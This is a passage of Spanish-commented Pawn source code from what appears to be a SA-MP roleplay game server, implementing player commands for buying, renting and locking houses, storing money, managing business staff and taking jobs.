	PlayerInfo[playerid][pCasa] = casa; //Setea la casa del jugador
	HouseInfo[casa][hComprada] = 1;
	format(HouseInfo[casa][hDueno], 60, "%s", PlayerInfo[playerid][pNombre]);
	HouseInfo[casa][hInquilinos] = 1;
	HouseInfo[casa][hAlquilable] = 0;
	HouseInfo[casa][hPAlquiler] = 0;
	format(string, sizeof(string), "Has comprado una casa por %d$.", HouseInfo[casa][hValor]);
	SendClientMessage(playerid, Verde, string);
	SendClientMessage(playerid, Verde, "Felicidades por tu nueva compra. Utiliza '/Ayuda Casa' para ver los comandos de tu casa.");
	printf("%s compra la casa %d por %d$",GetPlayerNameRP(playerid), casa, HouseInfo[casa][hValor]);
	UpdateHouseLabel(casa);
	SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/vendercasa", true) == 0) //Vender una casa
{
    if(PlayerInfo[playerid][pCasa] == 0){SendClientMessage(playerid,Rojo,"* No posees una casa."); return 1;} //No tiene casa
	if(GetPlayerFueraPuertaCasa(playerid) != PlayerInfo[playerid][pCasa]){SendClientMessage(playerid,Rojo,"* No estás en la puerta de tu casa."); return 1;} //No está en una casa
	new casa = PlayerInfo[playerid][pCasa];
	PlayerInfo[playerid][pCasa] = 0; //Setea la casa del jugador a 0
	PlayerInfo[playerid][pDineroBanco] += HouseInfo[casa][hValor];
	HouseInfo[casa][hComprada] = 0;
	format(HouseInfo[casa][hDueno], 60, "");
	HouseInfo[casa][hCerrada] = 1;
	HouseInfo[casa][hInquilinos] = 0;
	HouseInfo[casa][hAlquilable] = 0;
	HouseInfo[casa][hPAlquiler] = 0;
	format(string, sizeof(string), "Has vendido tu casa por %d$. El dinero se te ha ingresado en tu cuenta bancaria.", HouseInfo[casa][hValor]);
	SendClientMessage(playerid, Verde, string);
	printf("%s vende su casa %d por %d$",GetPlayerNameRP(playerid), casa, HouseInfo[casa][hValor]);
	UpdateHouseLabel(casa);
	SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/puerta", true) == 0) //Abrir/cerrar una casa o un local
{
	if(!GetPlayerFueraPuertaCasa(playerid) && !GetPlayerDentroPuertaCasa(playerid) && !GetPlayerFueraPuertaNego(playerid) && !GetPlayerDentroPuertaNego(playerid)){SendClientMessage(playerid,Rojo,"* No estás en la puerta de una casa o un local."); return 1;} //No está en una casa
	if(GetPlayerFueraPuertaCasa(playerid) || GetPlayerDentroPuertaCasa(playerid))
	{
        new casa;
        if(!GetPlayerDentroPuertaCasa(playerid)){casa = GetPlayerFueraPuertaCasa(playerid);}
		if(!GetPlayerFueraPuertaCasa(playerid)){casa = GetPlayerDentroPuertaCasa(playerid);}
		if(PlayerInfo[playerid][pCasa] != casa && PlayerInfo[playerid][pCasaAlq] != casa){SendClientMessage(playerid,Rojo,"* No tienes la llave de esta casa."); return 1;} //No es su casa
		if(HouseInfo[casa][hCerrada] == 0)
		{
		    HouseInfo[casa][hCerrada] = 1; GameTextForPlayer(playerid, "~r~Puerta cerrada", 2000, 3);
		}
		else
		{
		    HouseInfo[casa][hCerrada] = 0; GameTextForPlayer(playerid, "~g~Puerta abierta", 2000, 3);
		}
		UpdateHouseLabel(casa);
	}
	if(GetPlayerFueraPuertaNego(playerid) || GetPlayerDentroPuertaNego(playerid))
	{
	    new nego;
        if(!GetPlayerDentroPuertaNego(playerid)){nego = GetPlayerFueraPuertaNego(playerid);}
		if(!GetPlayerFueraPuertaNego(playerid)){nego = GetPlayerDentroPuertaNego(playerid);}
		if(PlayerInfo[playerid][pNegocio] != nego){SendClientMessage(playerid,Rojo,"* No tienes la llave de este local."); return 1;} //No es su negocio
		if(NegoInfo[nego][nCerrado] == 0)
		{
		    NegoInfo[nego][nCerrado] = 1; GameTextForPlayer(playerid, "~r~Puerta cerrada", 2000, 3);
		}
		else
		{
		    NegoInfo[nego][nCerrado] = 0; GameTextForPlayer(playerid, "~g~Puerta abierta", 2000, 3);
		}
		UpdateNegocioLabel(nego);
		SaveNegocios(nego);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/alquilable", true) == 0) //Hacer alquilable una casa
{
    if(PlayerInfo[playerid][pCasa] == 0){SendClientMessage(playerid,Rojo,"* No posees una casa."); return 1;} //No tiene casa
    new casa = PlayerInfo[playerid][pCasa];
	new opcion[128];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Alquilable [Si/No] ");
		return 1;
	}
	if(strcmp(opcion,"Si",true) == 0)
	{
	    HouseInfo[casa][hAlquilable] = 1; GameTextForPlayer(playerid, "~g~Casa alquilable", 2000, 3);
	}
	else if(strcmp(opcion,"No",true) == 0)
	{
        HouseInfo[casa][hAlquilable] = 0; GameTextForPlayer(playerid, "~r~Casa no alquilable", 2000, 3);
	}
	else
	{
	    SendClientMessage(playerid, Naranja, "* /Alquilable [Si/No] ");
		return 1;
	}
	UpdateHouseLabel(casa);
	SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/renta", true) == 0) //Precio de alquiler de una casa
{
	if(PlayerInfo[playerid][pCasa] == 0){SendClientMessage(playerid,Rojo,"* No posees una casa."); return 1;} //No tiene casa
	new casa = PlayerInfo[playerid][pCasa];
	if(HouseInfo[casa][hAlquilable] == 0){SendClientMessage(playerid,Rojo,"* Tu casa no es alquilable."); return 1;} //No tiene casa
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /Renta [Precio (0-200)]");
		return 1;
	}
	new precio = strval(tmp);
	if(precio < 0 || precio > 200){SendClientMessage(playerid,Rojo,"* El precio debe estar entre 0$ y 200$."); return 1;}
	HouseInfo[casa][hPAlquiler] = precio;
	format(string, sizeof(string), "Precio de alquiler de tu casa: %d$.", precio);
	SendClientMessage(playerid, Amarillo, string);
	UpdateHouseLabel(casa);
	SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desalojar", true) == 0) //Desalojar a una persona de tu casa
{
	if(PlayerInfo[playerid][pCasa] == 0){SendClientMessage(playerid,Rojo,"* No posees una casa."); return 1;}
	new casa = PlayerInfo[playerid][pCasa];
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Desalojar [ID]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(PlayerInfo[playerid2][pCasaAlq] != casa){SendClientMessage(playerid,Rojo,"* Esta persona no está alquilando tu casa."); return 1;}
    PlayerInfo[playerid2][pCasaAlq] = 0;
    HouseInfo[casa][hInquilinos] --;
    format(string, sizeof(string), "%s te ha desalojado de su casa.",GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, AmarilloClaro, string);
    format(string, sizeof(string), "Has desalojado a %s de tu casa.",GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AmarilloClaro, string);
    UpdateHouseLabel(casa);
	SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desalojartodos", true) == 0) //Desalojar a todas las personas persona de tu casa
{
    if(PlayerInfo[playerid][pCasa] == 0){SendClientMessage(playerid,Rojo,"* No posees una casa."); return 1;}
    new casa = PlayerInfo[playerid][pCasa];
    HouseInfo[casa][hInquilinos] = 1;
    format(string, sizeof(string), "%s te ha desalojado de su casa.",GetPlayerNameRP(playerid));
    SendClientMessage(playerid, AmarilloClaro, "Ahora nadie está alquilando tu casa.");
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(PlayerInfo[i][pCasaAlq] == casa){PlayerInfo[i][pCasaAlq] = 0; SendClientMessage(i, AmarilloClaro, string);}
    }
    format(string, sizeof(string), "UPDATE usuarios SET CasaAlq = 0 WHERE CasaAlq = %d", casa);
    mysql_query(1, string);
    UpdateHouseLabel(casa);
	SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/alquilar", true) == 0) //Alquilar una casa
{
    if(!GetPlayerFueraPuertaCasa(playerid)){SendClientMessage(playerid,Rojo,"* No estás en la puerta de una casa."); return 1;} //No está en una casa
	new casa = GetPlayerFueraPuertaCasa(playerid);
	if(HouseInfo[casa][hComprada] > 0) //Comprada
	{
		if(HouseInfo[casa][hAlquilable] == 0){SendClientMessage(playerid,Rojo,"* Esta casa no está en alquiler."); return 1;} //Casa comprada
	    if(PlayerInfo[playerid][pCasaAlq] > 0){SendClientMessage(playerid,Rojo,"* Ya estás alquilando una casa."); return 1;}
		if(PlayerInfo[playerid][pCasa] > 0){SendClientMessage(playerid,Rojo,"* No puedes alquilar una casa si tienes comprada otra."); return 1;} //Ya tiene casa
		if(HouseInfo[casa][hInquilinos] >= 4){SendClientMessage(playerid,Rojo,"* Esta casa no puede acoger a más personas."); return 1;} //Ya tiene casa
		if(GetPlayerMoney(playerid) < HouseInfo[casa][hPAlquiler]){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero."); return 1;}
		GivePlayerMoneyAC(playerid, -HouseInfo[casa][hPAlquiler]);
		PlayerInfo[playerid][pCasaAlq] = casa;
		HouseInfo[casa][hInquilinos] ++;
		format(string, sizeof(string), "Has alquilado una casa por %d$. A partir de ahora pagarás ese precio cada payday.", HouseInfo[casa][hPAlquiler]);
		SendClientMessage(playerid, Verde, string);
		SendClientMessage(playerid, Verde, "Utiliza '/Ayuda Casa' para ver los comandos de tu casa.");
		UpdateHouseLabel(casa);
		SaveCasa(casa);
	}
    else if(HouseInfo[casa][hComprada] == -1) //Hotel
	{
	    if(PlayerInfo[playerid][pCasaAlq] > 0){SendClientMessage(playerid,Rojo,"* Ya estás alquilando una casa."); return 1;}
		if(PlayerInfo[playerid][pCasa] > 0){SendClientMessage(playerid,Rojo,"* No puedes alquilar una habitación si tienes comprada otra."); return 1;} //Ya tiene casa
		if(HouseInfo[casa][hInquilinos] >= 1){SendClientMessage(playerid,Rojo,"* Esta habitación no puede acoger a más personas."); return 1;} //Ya tiene casa
		if(GetPlayerMoney(playerid) < HouseInfo[casa][hPAlquiler]){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero."); return 1;}
		GivePlayerMoneyAC(playerid, -HouseInfo[casa][hPAlquiler]);
		PlayerInfo[playerid][pCasaAlq] = casa;
		HouseInfo[casa][hInquilinos] = 1;
		format(string, sizeof(string), "Has alquilado una casa por %d$. A partir de ahora pagarás ese precio cada payday.", HouseInfo[casa][hPAlquiler]);
		SendClientMessage(playerid, Verde, string);
		SendClientMessage(playerid, Verde, "Utiliza '/Ayuda Casa' para ver los comandos de tu casa.");
		UpdateHouseLabel(casa);
		SaveCasa(casa);
	}
	else SendClientMessage(playerid,Rojo,"* Esta casa no está en alquiler.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desalquilar", true) == 0) //Desalquilar una casa
{
    if(PlayerInfo[playerid][pCasaAlq] == 0){SendClientMessage(playerid,Rojo,"* No estás alquilando ninguna casa."); return 1;}
    new casa = PlayerInfo[playerid][pCasaAlq];
    if(HouseInfo[casa][hComprada] == -1)
    {
        PlayerInfo[playerid][pCasaAlq] = 0;
	    HouseInfo[casa][hInquilinos] = 0;
	    HouseInfo[casa][hCerrada] = 1;
    }
    else
    {
	    PlayerInfo[playerid][pCasaAlq] = 0;
	    HouseInfo[casa][hInquilinos] --;
    }
    SendClientMessage(playerid, Verde, "Ya no estás alquilando ninguna casa.");
    UpdateHouseLabel(casa);
    SaveCasa(casa);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/armario", true) == 0) //Ver armario de una casa
{
 	if(!GetPlayerDentroCasa(playerid)){SendClientMessage(playerid, Rojo, "* No estás en una casa."); return 1;}
 	new casa = GetPlayerDentroCasa(playerid);
 	if(HouseInfo[casa][hComprada] >= 0 && PlayerInfo[playerid][pCasa] != casa){SendClientMessage(playerid, Rojo, "* No eres el propietario de esta casa."); return 1;}
 	if(HouseInfo[casa][hComprada] == -1){SendClientMessage(playerid, Rojo, "* Los hoteles y moteles no tienen armarios."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes usar este comando estando de servicio."); return 1;}
    MostrarArmario(playerid, casa);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/almacen", true) == 0) //Ver almacén de un local
{
 	if(!GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un local."); return 1;}
 	new nego = GetPlayerDentroNego(playerid);
 	if(NegoInfo[nego][nComprado] >= 0 && PlayerInfo[playerid][pNegocio] != nego){SendClientMessage(playerid, Rojo, "* No eres el propietario de este local."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes usar este comando estando de servicio."); return 1;}
    MostrarAlmacen(playerid, nego);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/guardardinero", true) == 0) //Guardar dinero en una casa o local
{
    if(!GetPlayerDentroCasa(playerid) && !GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en una casa o un local."); return 1;}
    if(GetPlayerDentroCasa(playerid))
    {
	 	new casa = GetPlayerDentroCasa(playerid);
	 	if(HouseInfo[casa][hComprada] >= 0 && PlayerInfo[playerid][pCasa] != casa){SendClientMessage(playerid, Rojo, "* No eres el propietario de esta casa."); return 1;}
	 	if(HouseInfo[casa][hComprada] == -1){SendClientMessage(playerid, Rojo, "* Los hoteles y moteles no tienen armarios."); return 1;}
	 	tmp = strtok(cmdtext, idx);
	   	if(!strlen(tmp))
	    {
		    SendClientMessage(playerid, Naranja, "* /GuardarDinero [Cantidad]");
		    format(string, sizeof(string), "Dinero guardado: %d$", HouseInfo[casa][hDineroGuardado]);
		    SendClientMessage(playerid, Naranja, string);
		    return 1;
		}
	    new dinero = strval(tmp);
	    if(dinero <= 0){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
	    if(dinero > GetPlayerMoney(playerid)){SendClientMessage(playerid, Rojo, "* No tienes tanto dinero."); return 1;}
	    HouseInfo[casa][hDineroGuardado] += dinero;
	    GivePlayerMoneyAC(playerid, -dinero);
	    format(string, sizeof(string), "Has guardado %d$ en tu casa.", dinero);
		SendClientMessage(playerid, Verde, string);
		SaveCasa(casa);
	}
	else if(GetPlayerDentroNego(playerid))
    {
        new nego = GetPlayerDentroNego(playerid);
	 	if(NegoInfo[nego][nComprado] >= 0 && PlayerInfo[playerid][pNegocio] != nego){SendClientMessage(playerid, Rojo, "* No eres el propietario de este local."); return 1;}
	 	tmp = strtok(cmdtext, idx);
	   	if(!strlen(tmp))
	    {
		    SendClientMessage(playerid, Naranja, "* /GuardarDinero [Cantidad]");
		    format(string, sizeof(string), "Dinero guardado: %d$", NegoInfo[nego][nDineroGuardado]);
		    SendClientMessage(playerid, Naranja, string);
		    return 1;
		}
	    new dinero = strval(tmp);
	    if(dinero <= 0){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
	    if(dinero > GetPlayerMoney(playerid)){SendClientMessage(playerid, Rojo, "* No tienes tanto dinero."); return 1;}
	    NegoInfo[nego][nDineroGuardado] += dinero;
	    GivePlayerMoneyAC(playerid, -dinero);
	    format(string, sizeof(string), "Has guardado %d$ en tu local.", dinero);
		SendClientMessage(playerid, Verde, string);
		SaveNegocios(nego);
    }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/sacardinero", true) == 0) //Sacar dinero en una casa o local
{
    if(!GetPlayerDentroCasa(playerid) && !GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en una casa o un local."); return 1;}
    if(GetPlayerDentroCasa(playerid))
    {
	 	new casa = GetPlayerDentroCasa(playerid);
	 	if(HouseInfo[casa][hComprada] >= 0 && PlayerInfo[playerid][pCasa] != casa){SendClientMessage(playerid, Rojo, "* No eres el propietario de esta casa."); return 1;}
	 	if(HouseInfo[casa][hComprada] == -1){SendClientMessage(playerid, Rojo, "* Los hoteles y moteles no tienen armarios."); return 1;}
	 	tmp = strtok(cmdtext, idx);
	   	if(!strlen(tmp))
	    {
		    SendClientMessage(playerid, Naranja, "* /SacarDinero [Cantidad]");
		    format(string, sizeof(string), "Dinero guardado: %d$", HouseInfo[casa][hDineroGuardado]);
		    SendClientMessage(playerid, Naranja, string);
		    return 1;
		}
	    new dinero = strval(tmp);
	    if(dinero <= 0){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
	    if(dinero > HouseInfo[casa][hDineroGuardado]){SendClientMessage(playerid, Rojo, "* No hay tanto dinero guardado."); return 1;}
	    HouseInfo[casa][hDineroGuardado] -= dinero;
	    GivePlayerMoneyAC(playerid, dinero);
	    format(string, sizeof(string), "Has sacado %d$ de tu casa.", dinero);
		SendClientMessage(playerid, Verde, string);
		SaveCasa(casa);
	}
	if(GetPlayerDentroNego(playerid))
    {
	 	new nego = GetPlayerDentroNego(playerid);
	 	if(NegoInfo[nego][nComprado] >= 0 && PlayerInfo[playerid][pNegocio] != nego){SendClientMessage(playerid, Rojo, "* No eres el propietario de este local."); return 1;}
	 	tmp = strtok(cmdtext, idx);
	   	if(!strlen(tmp))
	    {
		    SendClientMessage(playerid, Naranja, "* /SacarDinero [Cantidad]");
		    format(string, sizeof(string), "Dinero guardado: %d$", NegoInfo[nego][nDineroGuardado]);
		    SendClientMessage(playerid, Naranja, string);
		    return 1;
		}
	    new dinero = strval(tmp);
	    if(dinero <= 0){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
	    if(dinero > NegoInfo[nego][nDineroGuardado]){SendClientMessage(playerid, Rojo, "* No hay tanto dinero guardado."); return 1;}
	    NegoInfo[nego][nDineroGuardado] -= dinero;
	    GivePlayerMoneyAC(playerid, dinero);
	    format(string, sizeof(string), "Has sacado %d$ de tu local.", dinero);
		SendClientMessage(playerid, Verde, string);
		SaveNegocios(nego);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/contratar", true) == 0) //Contratar personal para el negocio
{
	if(PlayerInfo[playerid][pNegocio] == 0){SendClientMessage(playerid, Rojo, "* No posees un negocio."); return 1;}
	new nego = PlayerInfo[playerid][pNegocio];
	if(NegoInfo[nego][nTipo] == 6) //Es un taller
	{
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Contratar [ID]");
	        return 1;
	    }
	    playerid2 = ReturnUser(tmp);
	    if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes contratar a tí mismo."); return 1;}
	    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
		{
			SendClientMessage(playerid, Rojo, "* ID inválida.");
			return 1;
		}
		if(!GetPlayersProx(5.0, playerid, playerid)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
		if(PlayerInfo[playerid2][pTrabajo] != 7){SendClientMessage(playerid, Rojo, "* Esa persona no trabaja de mecánico."); return 1;}
		if(PlayerInfo[playerid2][pTaller] == nego){SendClientMessage(playerid, Rojo, "* Esa persona ya trabaja en tu taller."); return 1;}
		if(PlayerInfo[playerid2][pTaller] != 0){SendClientMessage(playerid, Rojo, "* Esa persona ya trabaja en un taller."); return 1;}
		Contratador[playerid2] = playerid;
		Contrato[playerid2] = 6;
		format(string, sizeof(string), "Has ofrecido a %s un contrato para trabajar en tu taller. Espera una respuesta.", GetPlayerNameRP(playerid2));
	    SendClientMessage(playerid, Amarillo, string);
	    format(string, sizeof(string), "%s te ha ofrecido un contrato para trabajar en su taller Utiliza '/Aceptar Contrato' para aceptarlo.", GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, Amarillo, string);
	}
	else{SendClientMessage(playerid, Rojo, "* No posees un negocio que permita contratar personal."); return 1;}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/despedir", true) == 0) //Despedir personal del negocio
{
    if(PlayerInfo[playerid][pNegocio] == 0){SendClientMessage(playerid, Rojo, "* No posees un negocio."); return 1;}
	new nego = PlayerInfo[playerid][pNegocio];
	if(NegoInfo[nego][nTipo] == 6) //Es un taller
	{
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Despedir [ID]");
	        return 1;
	    }
	    playerid2 = ReturnUser(tmp);
	    if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes despedir a tí mismo."); return 1;}
	    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
		{
			SendClientMessage(playerid, Rojo, "* ID inválida.");
			return 1;
		}
		if(PlayerInfo[playerid2][pTaller] != nego){SendClientMessage(playerid, Rojo, "* Esa persona no trabaja en tu taller."); return 1;}
		format(string, sizeof(string), "Has despedido a %s de tu taller.", GetPlayerNameRP(playerid2));
	    SendClientMessage(playerid, Amarillo, string);
	    format(string, sizeof(string), "%s te ha despedido de su taller. Ya no puedes trabajar de mecánico en él.", GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, Amarillo, string);
	    PlayerInfo[playerid2][pTaller] = 0;
	}
	else{SendClientMessage(playerid, Rojo, "* No posees un negocio que permita contratar personal, por lo tanto tampoco permite despedir."); return 1;}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/despedirtodos", true) == 0) //Despedir todo el personal de un negocio
{
    if(PlayerInfo[playerid][pNegocio] == 0){SendClientMessage(playerid, Rojo, "* No posees un negocio."); return 1;}
	new nego = PlayerInfo[playerid][pNegocio];
	if(NegoInfo[nego][nTipo] == 6) //Es un taller
	{
	    format(string, sizeof(string), "%s te ha despedido de su taller. Ya no puedes trabajar de mecánico en él.", GetPlayerNameRP(playerid));
	    for(new i=0;i<MAX_PLAYERS;i++)
	    {
	        if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID && PlayerInfo[i][pTaller] == nego && PlayerInfo[i][pNegocio] != nego)
	        {
			    SendClientMessage(playerid2, Amarillo, string);
			    PlayerInfo[playerid2][pTaller] = 0;
		    }
	    }
        format(string, sizeof(string), "UPDATE usuarios SET Taller = 0 WHERE (Taller = %d AND Negocio <> %d)", nego, nego);
    	mysql_query(1, string);
	    SendClientMessage(playerid, Amarillo, "Ahora nadie trabaja en tu negocio.");
	    
	}
	else{SendClientMessage(playerid, Rojo, "* No posees un negocio que permita contratar personal, por lo tanto tampoco permite despedir."); return 1;}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/plantilla", true) == 0) //Ver los que trabajan en un negocio
{
    if(PlayerInfo[playerid][pNegocio] == 0){SendClientMessage(playerid, Rojo, "* No posees un negocio."); return 1;}
	new nego = PlayerInfo[playerid][pNegocio];
	if(NegoInfo[nego][nTipo] == 6) //Es un taller
	{
		SendClientMessage(playerid2, Amarillo, "Personal conectado de tu negocio:");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID && PlayerInfo[i][pTaller] == nego)
			{
				format(string, sizeof(string), "- %s [ID: %d]", PlayerInfo[i][pNombre], i);
				SendClientMessage(playerid, Blanco, string);
			}
		}
	}
	else{SendClientMessage(playerid, Rojo, "* No posees un negocio que permita contratar personal."); return 1;}
	return 1;
}

//----------COMANDOS TRABAJO----------//

if(strcmp(cmd, "/trabajo", true) == 0) //Conseguir un trabajo
{
	if(PlayerInfo[playerid][pFaccion] >= 1 && PlayerInfo[playerid][pFaccion] <= 4){SendClientMessage(playerid, Rojo, "* Formas parte de una facción pública, ese es tu trabajo."); return 1;}
	if(PlayerInfo[playerid][pTrabajo] != 0){SendClientMessage(playerid, Rojo, "* Ya tienes un empleo."); return 1;}
    new job = NOEXISTE;
	for(new x=0; x < sizeof(Jobs); x++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, Jobs[x][Jx], Jobs[x][Jy], Jobs[x][Jz])){job = x; break;}
	}
	if(job == NOEXISTE){OfertaTrabajo[playerid] = NOEXISTE; SendClientMessage(playerid, Rojo, "* No estás en ninguna oferta de trabajo."); return 1;}
	if(job == 9){job = 6;} //Mecánico en taller de unity
	if(job == 2 && PlayerInfo[playerid][pNivel] < 2){SendClientMessage(playerid, Rojo, "* Necesitas nivel 2 para acceder a este trabajo."); return 1;}
	if(job == 4 && (PlayerInfo[playerid][pNivel] < 3 || PlayerInfo[playerid][pLicAviacion] == 0)){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 y licencia de aviación para acceder a este trabajo."); return 1;}
	if(job == 5 && PlayerInfo[playerid][pNivel] < 2){SendClientMessage(playerid, Rojo, "* Necesitas nivel 2 para acceder a este trabajo."); return 1;}
	if(job == 6 && PlayerInfo[playerid][pNivel] < 2){SendClientMessage(playerid, Rojo, "* Necesitas nivel 2 para acceder a este trabajo."); return 1;}
	if(job == 7 && PlayerInfo[playerid][pNivel] < 3){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 para acceder a este trabajo."); return 1;}
	if(job == 8 && (PlayerInfo[playerid][pNivel] < 3 || PlayerInfo[playerid][pLicNavegacion] == 0)){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 y licencia de navegación para acceder a este trabajo."); return 1;}

	if(OfertaTrabajo[playerid] == NOEXISTE)
	{
		OfertaTrabajo[playerid] = job;
		format(string, sizeof(string), "Oferta de %s. Paga horaria: %d$", Jobs[job][JobNombre], Jobs[job][JobPay]);
		SendClientMessage(playerid, Amarillo, string);
		SendClientMessage(playerid, Amarillo, "¿Estás seguro de que deseas este empleo? Escribe '/Trabajo' de nuevo si es así.");
	}
	else
	{
	    PlayerInfo[playerid][pTrabajo] = OfertaTrabajo[playerid]+1;
	    OfertaTrabajo[playerid] = NOEXISTE;
	    PlayerInfo[playerid][pContrato] = 5;
	    format(string, sizeof(string), "Has aceptado el empleo de %s", Jobs[job][JobNombre]);
		SendClientMessage(playerid, Verde, string);
		SendClientMessage(playerid, Amarillo, "Escribe '/Ayuda Trabajo' para más información.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/trabajar", true) == 0) //Comienza a trabajar
{
	if(Trabajando[playerid] == 0)
	{
		if(PlayerInfo[playerid][pTrabajo] == 0){SendClientMessage(playerid, Rojo, "* No tienes empleo."); return 1;}
		new empleo = PlayerInfo[playerid][pTrabajo];
		new job = empleo-1;
		if(empleo == 1) //Pizzero
		{
		    if(PlayerInfo[playerid][pEsperaTrabajar] > 0)
		    {
		        format(string, sizeof(string), "* Estás cansado de trabajar. Vuelve en %d minutos.", PlayerInfo[playerid][pEsperaTrabajar]);
		        SendClientMessage(playerid, Rojo, string);
				return 1;
		    }
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, Jobs[job][Jx], Jobs[job][Jy], Jobs[job][Jz])){SendClientMessage(playerid, Rojo, "* No estás en tu puesto de trabajo."); return 1;}
			SetPlayerSkin(playerid, 155);
			Trabajando[playerid] = 1;
			SendClientMessage(playerid, Verde, "Sube a una moto de reparto para comenzar a trabajar.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 2) //Barrendero
		{
		    if(PlayerInfo[playerid][pEsperaTrabajar] > 0)
		    {
		        format(string, sizeof(string), "* Estás cansado de trabajar. Vuelve en %d minutos.", PlayerInfo[playerid][pEsperaTrabajar]);
		        SendClientMessage(playerid, Rojo, string);
				return 1;
		    }
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, Jobs[job][Jx], Jobs[job][Jy], Jobs[job][Jz])){SendClientMessage(playerid, Rojo, "* No estás en tu puesto de trabajo."); return 1;}
			SetPlayerSkin(playerid, 16);
			Trabajando[playerid] = 1;
			SendClientMessage(playerid, Verde, "Sube a un limpiacalles para comenzar a trabajar.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 3) //Securicar
		{
		    if(PlayerInfo[playerid][pEsperaTrabajar] > 0)
		    {
		        format(string, sizeof(string), "* Estás cansado de trabajar. Vuelve en %d minutos.", PlayerInfo[playerid][pEsperaTrabajar]);
		        SendClientMessage(playerid, Rojo, string);
				return 1;
		    }
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, Jobs[job][Jx], Jobs[job][Jy], Jobs[job][Jz])){SendClientMessage(playerid, Rojo, "* No estás en tu puesto de trabajo."); return 1;}
			SetPlayerSkin(playerid, 165);
			Trabajando[playerid] = 1;
			SendClientMessage(playerid, Verde, "Sube a un securicar para comenzar a trabajar.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 4) //Cosechador
		{
		    if(PlayerInfo[playerid][pEsperaTrabajar] > 0)
		    {
		        format(string, sizeof(string), "* Estás cansado de trabajar. Vuelve en %d minutos.", PlayerInfo[playerid][pEsperaTrabajar]);
		        SendClientMessage(playerid, Rojo, string);
				return 1;
		    }
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, Jobs[job][Jx], Jobs[job][Jy], Jobs[job][Jz])){SendClientMessage(playerid, Rojo, "* No estás en tu puesto de trabajo."); return 1;}
		    SetPlayerSkin(playerid, 161);
			Trabajando[playerid] = 1;
